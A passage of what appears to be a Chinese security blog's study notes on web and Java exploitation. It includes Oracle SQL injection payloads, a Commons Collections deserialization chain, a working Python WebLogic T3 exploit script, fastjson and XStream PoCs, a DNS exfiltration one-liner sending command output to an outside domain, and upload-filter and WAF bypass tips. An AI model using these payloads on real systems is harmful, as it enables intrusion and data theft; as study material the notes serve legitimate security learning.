+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):</span><br><span class="line">  123&#x3D;(case when ascii(substr(user,§0§,1))&#x3D;§121§ then &#39;123&#39; else &#39;456&#39; end)--+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过 case、instr()、chr() 函数的盲注</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为:所有可见字符的ASCII码(32~126): 第二个,第三个为:值相同为截取位数</span><br><span class="line">123&#x3D;(case instr(user,chr(§*§),§*§,1) when §*§ then &#39;123&#39; else &#39;456&#39; end)--+</span><br></pre></td></tr></table></figure>
+
+<p>后面这两个完全可以不用ascii、instr函数直接判断字符，这样做的目的也就是方便写脚本。还有其他方式来利用,配合函数,不同环境不同用法，但是用脚本爆破盲注其实远不如用外带数据通道来做。</p>
+<h4 id="3、-基于时间的盲注"><a href="#3、-基于时间的盲注" class="headerlink" title="3、 基于时间的盲注"></a>3、 基于时间的盲注</h4><p>时间盲注，<strong>基于服务器返回所用的时间，判断函数是否执行，从而判断是否存在注入</strong></p>
+<ul>
+<li>Decode()、DBMS_PIPE.receive_message()、chr()、substr()利用</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):</span><br><span class="line">&#39;||decode(substr(user,§*§,1),chr(§*§),DBMS_PIPE.receive_message(&#39;sen&#39;,1),2)||&#39; #查user</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.cnblogs.com/-qing-/p/10951998.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/10951998.html</a> 详细的时间盲注，从权限和耗时角度考虑，耗时上也可以运用到笛卡尔积。</p>
+<h2 id="0x03-后话思路"><a href="#0x03-后话思路" class="headerlink" title="0x03 后话思路"></a>0x03 后话思路</h2><p>1、 实际测试过程中，与网站交互或存在注入的概率不是很大。着重测试一些微应用的后端或者后端的api。所以在搜索处，表单的提交处，各种与后台交互的细小的点都可以测试。</p>
+<p>2、 只要自己成功判断后端执行了我们拼接的sql语句。就是存在问题，配合数据库特性1/0也是可以的。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>十月整理的问题/1</title>
+    <url>/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近blog写的比较懒了，其实不是学习停滞了，而我觉得是学习的速度加快了。很多问题都是之前遇到过得，只能说是更加深入，深一步的发展，于是有了这篇零零散散的笔记。并且贴了一些文章的链接，这些大佬的思路都是非常好的，很严密，这样每次去翻阅的时候也会印象更深。并且在基础上面，再去整理一些大致的思路和框架。反正记了不一定能记住，思路永远可以学习强化。</p>
+<p>其次是很多我喜欢画图，纸质笔记本上面对一些问题的整理翻看也会更快一点。</p>
+<h2 id="CC链："><a href="#CC链：" class="headerlink" title="CC链："></a>CC链：</h2><p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/1&e=1635695999&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zDRZ7Zotl8IjAQ-PaUN3SjwDFlruQ=.png" alt="img"></p>
+<h3 id="CC1："><a href="#CC1：" class="headerlink" title="CC1："></a>CC1：</h3><ul>
+<li>JDK 1.7</li>
+<li>Commons Collections 3.1</li>
+</ul>
+<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p><a href="https://paper.seebug.org/1242/#commonscollections-1" target="_blank" rel="noopener">https://paper.seebug.org/1242/#commonscollections-1</a></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get() <span class="comment">//找不到反射的构造方法就静态生成</span></span><br><span class="line">                            ChainedTransformer.transform()<span class="comment">//（每个传入的transformer都调用其transform方法，并将结果作为下一次的输入传递进去）</span></span><br><span class="line">                                ConstantTransformer.transform()<span class="comment">//（transform方法将输入原封不动的返回）</span></span><br><span class="line">                                InvokerTransformer.transform()<span class="comment">//（通过反射来调用某方法）</span></span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p>sourcce，gadget，sink </p>
+<p>​    在commons collections中有一个<strong>Transformer接口，其中包含一个transform方法</strong>，通过实现此接口来达到类型转换的目的。</p>
+<p>需要传递一个Runtime.getRuntime()的runtime实例进去，而Runtime并没有继承Serializable，所以runtime也要进行反射来生成。</p>
+<p>Class[].class，其实就是对应着这里的可变参数,再加一个new Class[0]起到占位的作用。</p>
+<p>1、<code>Templates</code>类的<code>newTransformer</code>方法，会将属性<code>_bytecodes</code>，通过调用java的<code>defineClass</code>去生成一个类，并将其实例化，也就是调用静态代码块的代码。2、而<code>AnnotationInvocationHandler</code>，创建一个<code>Templates</code>的jdk动态代理，在hashmap出现哈希碰撞的时候，在hashmap中会调用<code>AnnotationInvocationHandler</code>的equal方法，equal方法会调用自身的equalImpl方法。最终会调用被代理对象的每个方法，去生成结果。3、因为<code>newTransformer</code>方法恰好为<code>Templates</code>的第一个方法，如果是第二个方法的话，会导致执行第一个方法的时候出错而中断整个反序列化链。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[]&#123;"open  /System/Applications/Calculator.app"&#125;)&#125;);</span><br><span class="line">        chain.transform(<span class="number">123</span>);</span><br></pre></td></tr></table></figure>
+
+<p>weblogic中，必须要调用<code>FilteredObjectInputStream</code>，才可以在反序列化过程中使用反序列化的黑名单。如果类中私自调用<code>ObjectInputStream</code>，则不会应用weblogic反序列化的黑名单。从而绕过</p>
+<p>动态代理：<strong>实现了不需要中间商proxy（类），直接“创建”某个接口的实例，对其方法进行调用。</strong></p>
+<p>实现原理： 实现InvocationHandler类的invoke方法，类生成的时候Proxy.newProxyInstance传入classloader,class的class类，invocationhandler接口，并用那个class类转型。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                System.out.println(method);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"morning"</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"Good morning, "</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(method.getName().equals(<span class="string">"fuck"</span>))&#123;</span><br><span class="line">                    System.out.println(<span class="string">"Hello,fucker"</span>+ args[<span class="number">0</span>]);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Hello hello = (Hello)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Hello<span class="class">.<span class="keyword">class</span>&#125;,<span class="title">handler</span>)</span>;</span><br><span class="line">        hello.morning(<span class="string">"v1rus"</span>);</span><br><span class="line">        hello.fuck(<span class="string">"v1rus"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704</a></p>
+<p>Weblogic 的反序列化漏洞中主要是 XMLDecoder 和 T3（ Weblogic RMI 调用时的通信协议，基础通信协议是 JRMP） 弱密码部署war包，ssrf等。</p>
+<p>先会发一个试探包 <code>t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n</code> ， 然后 Weblogic 会回应 HELO 和自身的版本，然后接下来是我们的 payload 的数据包</p>
+<p>CVE-2015-4852：resolveClass 中没有做防护，以及 Weblogic 后续的补丁都是在 resolveClass 中进行防护的，所以我们这里来看看</p>
+<p>协议：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">【数据包长度】【T3协议头】【反序列化标志】【数据】</span><br><span class="line"></span><br><span class="line">通常在反序列化数据包中，ac ed 00 05 是反序列化标志，在 T3 协议中由于每个反序列化数据包前面都有 fe 01 00 00 ，所以这里的反序列化标志相当于就是 fe 01 00 00 ac ed 00 05</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20210927161345133.png" alt="image-20210927161345133"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment"># 负责大小端的转换 </span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generatePayload</span><span class="params">(gadget,cmd)</span>:</span></span><br><span class="line">    YSO_PATH = <span class="string">"/Users/xxxx/tools/ysoserial/ysoserial-master-d367e379d9-1.jar"</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T3Exploit</span><span class="params">(ip,port,payload)</span>:</span></span><br><span class="line">    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    compile = re.compile(<span class="string">"HELO:(.*).0.false"</span>)</span><br><span class="line">    match = compile.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        print(<span class="string">"Weblogic: "</span>+<span class="string">""</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Not Weblogic"</span>)</span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    header = binascii.a2b_hex(<span class="string">b"00000000"</span>) <span class="comment">#先进性占位</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span>)  <span class="comment">#t3协议头</span></span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b"fe010000"</span>) <span class="comment">#t3反序列化标志</span></span><br><span class="line">    payload = header + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">"&gt;I"</span>,len(payload)) + payload[<span class="number">4</span>:] //对占位进行修改，计算payload长度进行修改</span><br><span class="line">    sock.send(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    ip = <span class="string">"127.0.0.1"</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">"CommonsCollections1"</span></span><br><span class="line">    cmd = <span class="string">"touch /tmp/success"</span></span><br><span class="line">    payload = generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="XStream"><a href="#XStream" class="headerlink" title="XStream"></a>XStream</h2><p><a href="https://mp.weixin.qq.com/s/jWa6SW3PfVsZ5Qzlmx_2EQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jWa6SW3PfVsZ5Qzlmx_2EQ</a></p>
+<p>XStream是一个序列化存储对象的库，类似于java原生的序列化</p>
+<p>可以序列化<strong>未继承自</strong><code>java.io.serializable</code>接口的类的对象。其他功能均与java原生的序列化功能一样，如果xstream在反序列化的时候发现还原继承自<code>java.io.serializable</code>的类，则同样会调用对象的<code>readObject</code>方法。</p>
+<p>xml标签中，首先存储父类的字段信息，然后再存储子类的。顺序则按照类声明字段的顺序。每一层，都会注明子类的全限定名。在对象中，每个xml标签对应着对象的字段。</p>
+<h2 id="反序列化的方法"><a href="#反序列化的方法" class="headerlink" title="反序列化的方法"></a>反序列化的方法</h2><p>UnicastRef对象的readExternal方法</p>
+<p>Window下，推荐用 EmEditor 进行日志分析</p>
+<h2 id="命令不出网"><a href="#命令不出网" class="headerlink" title="命令不出网"></a>命令不出网</h2><p>命令自动查找bsa.js并在其目录写入文件（由于可能不知道是什么盘可能需要多次尝试），寻找js文件将参数传入之后写入。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cmd /c <span class="string">"for /f %i in ('dir /s /b e:bsa.js') do (echo %i&gt; %i.path.txt)%26(ipconfig &gt; %i.ipconfig.txt)"</span></span><br></pre></td></tr></table></figure>
+
+<p>成test.txt写入id pwd ifconfig命令的结果</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name bas.js|<span class="keyword">while</span> <span class="built_in">read</span> f;<span class="keyword">do</span> sh -c <span class="string">'id;pwd;ifconfig'</span> &gt;$(dirname <span class="variable">$f</span>)/test.txt;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>(1) 利用格式化输出</strong></p>
+<p>命令如下：</p>
+<p>(pwd;id;hostname)|xxd -ps -c 20|awk’{system(“nslookup “NR”.”$0”.c.pproot.com”)}’</p>
+<p>2、 过java反序列化执行java代码&amp;&amp;系统命令获取到发起这次请求时对应的服务端socket文件描述符，然后在<strong>文件描述符写入回显内容</strong>。</p>
+<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p><a href="https://www.kingkk.com/2020/06/%E6%B5%85%E8%B0%88%E4%B8%8BFastjson%E7%9A%84autotype%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">https://www.kingkk.com/2020/06/%E6%B5%85%E8%B0%88%E4%B8%8BFastjson%E7%9A%84autotype%E7%BB%95%E8%BF%87/</a></p>
+<p>key值为<code>@type</code>时，就会进入<code>checkAutoType</code>函数尝试获取类，校验<code>SupportAutoType</code>属性的工作却是在<code>checkAutoType</code>函数中完成的。</p>
+<p>首先尝试从<code>TypeUtils</code>的<code>mappings</code>中获取对应类，里面原本就有一些类，而且后续会被当作已获取类的缓存使用。然后是尝试从<code>deserializers.findClass</code>中获取class类，这里面的类主要是在<code>ParserConfig.initDeserializers()</code>中被赋值的。也就相当于这些特殊类也可以被无条件的反序列化。然后就是尝试从<code>typeMapping</code>中获取对应类，这其中默认的值为空，需要开发人员自行赋值。</p>
+<p>然后就是在没有开启<code>SupportAutoType</code>时，通过黑白名单去校验类，黑名单抛出异常，白名单加载类并返回。</p>
+<p>之后如果 开启了<code>SupportAutoType</code> 或者 有<code>JSONType</code>的注解 或者 存在期望类，则会直接去加载对应类</p>
+<p>主要就是进入checkAutoType函数之后，有很多的return。然后抛出异常是放在了最后。</p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/1591603136408.png" alt="img"></p>
+<p>可以看到主要有如下种情况可以直接返回class</p>
+<ul>
+<li><code>acceptHashCodes</code> 白名单  </li>
+<li><code>INTERNAL_WHITELIST_HASHCODES</code> 内部白名单</li>
+<li><code>TypeUtils.mappings</code> mappings缓存</li>
+<li><code>deserializers.findClass</code> 指定类</li>
+<li><code>typeMapping.get</code> 默认为空</li>
+<li><code>JsonType</code> 注解</li>
+<li><code>exceptClass</code> 存在期望类</li>
+</ul>
+<p>1、首先尝试从<code>TypeUtils</code>的<code>mappings</code>中获取对应类2、然后是尝试从<code>deserializers.findClass</code>中获取class类，这里面的类主要是在<code>ParserConfig.initDeserializers()</code>中被赋值的。3、然后就是尝试从<code>typeMapping</code>中获取对应类，这其中默认的值为空，需要开发人员自行赋值。4、之后就是类在白名单中时（但几乎不大可能），尝试自动去加载类。5、最后，如果通过以上方式可以加载到类，则校验期望类，没有问题的话就直接返回对应的class。</p>
+<p>1.2.47绕过： 因此就可以首先通过反序列化<code>java.lang.Class</code>指定恶意类，然后恶意类被加入<code>mappings</code>缓存后，第二次就可以直接从缓存中获取到恶意类，并进行反序列化。</p>
+<p>将这个 JSONObject 放<strong>在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.DefaultJSONParser.parseObject</span><br><span class="line">DefaultJSONParser.java:436</span><br><span class="line"></span><br><span class="line">if (object.getClass() &#x3D;&#x3D; JSONObject.class) &#123;</span><br><span class="line">    key &#x3D; (key &#x3D;&#x3D; null) ? &quot;null&quot; : key.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是乎就触发了 BasicDataSource.getConnection()。PoC最完整的写法应该是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;x&quot;:&#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: &quot;x&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然，如果目标环境的开发者代码中是调用的是 JSON.parseObject() ，那就不用这么麻烦了。与 parse() 相比，parseObject() 会额外的将 Java 对象转为 JSONObject 对象，即调用 JSON.toJSON()，在处理过程中会调用所有的 setter 和 getter 方法。</p>
+<h2 id="XStream-1"><a href="#XStream-1" class="headerlink" title="XStream"></a>XStream</h2><p>XStream序列化和反序列化的核心是通过<code>Converter</code>转换器来将XML和对象之间进行相互的转换。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">     XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line"></span><br><span class="line">     String xml =</span><br><span class="line">             <span class="string">"&lt;sorted-set&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"    &lt;string&gt;foo&lt;/string&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"    &lt;dynamic-proxy&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"        &lt;handler class=\"java.beans.EventHandler\"&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"            &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"                &lt;command&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"                    &lt;string&gt;cmd&lt;/string&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"                    &lt;string&gt;/C&lt;/string&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"                    &lt;string&gt;calc&lt;/string&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"                &lt;/command&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"            &lt;/target&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"            &lt;action&gt;start&lt;/action&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"        &lt;/handler&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"    &lt;/dynamic-proxy&gt;\n"</span> +</span><br><span class="line">                     <span class="string">"&lt;/sorted-set&gt;"</span>;</span><br><span class="line">     </span><br><span class="line">    xStream.fromXML(xml);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20210928113301242.png" alt="image-20210928113301242"></p>
+<h2 id="Tomcat非双亲委派"><a href="#Tomcat非双亲委派" class="headerlink" title="Tomcat非双亲委派"></a>Tomcat非双亲委派</h2><p>Tomcat的类加载机制是违反了双亲委托原则的，对于一些未加载的非基础类(Object,String等)，各个web应用自己的类加载器(WebAppClassLoader)会优先加载，加载不到时再交给commonClassLoader走双亲委托。</p>
+<p>1、一个web容器可能需要部署两个应用程序，不同的应用程序可能会依赖同一个第三方类库的不同版本，不能要求同一个类库在同一个服务器只有一份，因此要保证每个应用程序的类库都是独立的，保证相互隔离。<strong>不同版本相互独立隔离。</strong></p>
+<p>2、部署在同一个web容器中相同的类库<strong>相同的版本可以共享</strong>。否则，如果服务器有10个应用程序，那么要有10份相同的类库加载进虚拟机，这是扯淡的。</p>
+<p>3、web容器也有自己依赖的类库，不能于应用程序的类库混淆。基于安全考虑，应该让容器的类库和程序的类库隔离开来。<strong>web容器类库不能与应用程序类库混淆。</strong></p>
+<p>4、web容器要支持jsp的修改，我们知道，jsp 文件最终也是要编译成class文件才能在虚拟机中运行，但程序运行后修改jsp已经是司空见惯的事情，否则要你何用？ 所以，<strong>web容器需要支持 jsp 修改后不用重启</strong>。</p>
+<p>JDBC,JNDI,Thread.currentThread().setContextClassLoader();等很多地方都一样是违反了双亲委托。</p>
+<p><a href="https://blog.csdn.net/yangcheng33/article/details/52631940" target="_blank" rel="noopener">https://blog.csdn.net/yangcheng33/article/details/52631940</a></p>
+<p>因为这句Class.forName(DriverName, false, loader)代码所在的类在java.util.ServiceLoader类中，而ServiceLoader.class又加载在BootrapLoader中，因此传给 forName 的 loader 必然不能是BootrapLoader，复习双亲委派加载机制请看：java类加载器不完整分析 。这时候只能使用TCCL了，也就是说把自己加载不了的类加载到TCCL中（通过Thread.currentThread()获取，简直作弊啊！）。上面那篇文章末尾也讲到了TCCL默认使用当前执行的是代码所在应用的系统类加载器AppClassLoader。</p>
+<p>再看下看ServiceLoader.load(Class)的代码，的确如此：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;S&gt; <span class="function">ServiceLoader&lt;S&gt; <span class="title">load</span><span class="params">(Class&lt;S&gt; service)</span> </span>&#123;</span><br><span class="line">    ClassLoader cl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="keyword">return</span> ServiceLoader.load(service, cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>ContextClassLoader默认存放了AppClassLoader的引用，由于它是在运行时被放在了线程中，所以不管当前程序处于何处（BootstrapClassLoader或是ExtClassLoader等），在任何需要的时候都可以用Thread.currentThread().getContextClassLoader()取出应用程序类加载器来完成需要的操作。</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20210928155349175.png" alt="image-20210928155349175"></p>
+<ol>
+<li><p>通 过 host 碰 撞 找 到 真 实 IP 绕 过 云 waf（fofa 这 种 是 搜 不 到 真 实 IP 的）</p>
+</li>
+<li><p>Content-Encoding=deflate 绕过本地防火墙内容检测，gzip也是能绕的（这个也可以放在请求头中）</p>
+</li>
+<li><p>于是翻了翻笔记，找到以前屡试不爽的上传 Tips ————添加 Accept-Encoding: deflate，但发现这种方法已经过时了，换成 Accept-Encoding: gzip 发现还是过不了这个拦截gzip　　表明实体采用GNU zip编码</p>
+<p>compress 表明实体采用Unix的文件压缩程序</p>
+<p>deflate　　表明实体是用zlib的格式压缩的</p>
+<p>identity　　表明没有对实体进行编码。当没有Content-Encoding header时， 就默认为这种情况</p>
+<p>gzip, compress, 以及deflate编码都是无损压缩算法，用于减少传输报文的大小，不会导致信息损失。 其中gzip通常效率最高， 使用最为广泛。</p>
+</li>
+<li><p>jspa jhtml jsp jspx</p>
+</li>
+</ol>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20211029152156241.png" alt="image-20211029152156241"></p>
+<ol>
+<li><p>条件竞争上传</p>
+<p>定义：竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中</p>
+<p>10.27看了条件竞争上传，大致的流程就是先上传文件到临时目录或者其他目录，再去判断文件名的后缀是否合法，不合法再删除文件。这个操作是不可取的。大致流程：php:if(move_uploaded_file($tmpFile,$upload_File)) -&gt; inarray($fileext,$ext_arr)-&gt;unlink($upload_file)。利用方式：上传白名单类的文件之后，知道上传的路径在哪，多线程上传之后再不停访问这个文件，这个文件再去释放一个php马。</p>
+</li>
+<li><p>二次渲染</p>
+<p>1、对比要上传图片与上传后的图片大小，编辑器打开图片查看上传后保留了拿些数据。2、并且需要配合文件包含漏洞。这个利用条件比较的困难。</p>
+</li>
+<li><p>但是<code>.htaccess</code>只是适用于<code>apache</code>，如果变成<code>niginx</code>或者<code>iis</code>则不会被解析。而在服务器以<code>fastcgi</code>启动运行的时候，<code>.user.ini</code>也是<code>php</code>的一种配置文件。</p>
+</li>
+</ol>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20210928155415575.png" alt="image-20210928155415575"></p>
+<p>burp里面的探测 engagement tools Search方法 302跳转的，或者有http字段的。</p>
+<p>1、ssrf出现的位置，其实burp抓包，不管是get的参数还是post的参数，我们都可以直接fuzzing，就比如post的数据，image=admin，我们image=<a href="http://vps:1234" target="_blank" rel="noopener">http://vps:1234</a> 都要不断尝试。不一定非要在网上说的那几个位置才能想到ssrf<br>2、认清ssrf的作用，像ssrf-&gt;getshell真的太少了，都是配合ssrf收集信息打组合拳，就比如配合redis拿shell，首先是对面可能存在redis，然后未授权。然后写东西的时候不出玄学问题，就行了<br>3、ssrf最主要的几个功能是<strong>收集服务器的真实IP，探测内部文件</strong>，比如看看能不能通过gopher,file等协议读取东西，如果能探测web的端口，可以看看找一些get参数就能拿东西的漏洞，比如get型的sql注入</p>
